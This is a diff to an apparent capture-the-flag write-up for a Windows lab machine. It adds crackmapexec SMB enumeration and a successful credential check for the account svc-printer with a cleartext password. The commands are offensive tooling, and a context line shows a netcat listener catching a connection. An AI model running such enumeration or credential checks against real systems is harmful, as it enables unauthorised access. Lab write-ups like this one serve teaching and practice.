@@ -158,16 +158,26 @@ connect to [10.10.14.28] from (UNKNOWN) [10.10.11.108] 54344
 
 <br />
 
-Now that we have a `password` and a `user`, we can try `validating` the user with `crackmapexec`.
-
-To do it we are going to execute the following command:
+`Crackmapexec` shows as that the domain name is `return.local` and another `SMB` information:
 
 <br />
 
 ```bash
-
+❯ crackmapexec smb 10.10.11.108
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
 ```
 
 <br />
 
+Now we are going to check if the our credentials are valid to the printer username -> svc-printer:
+
+<br />
+
+```bash
+❯ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!!
+```
+
+<br />
 
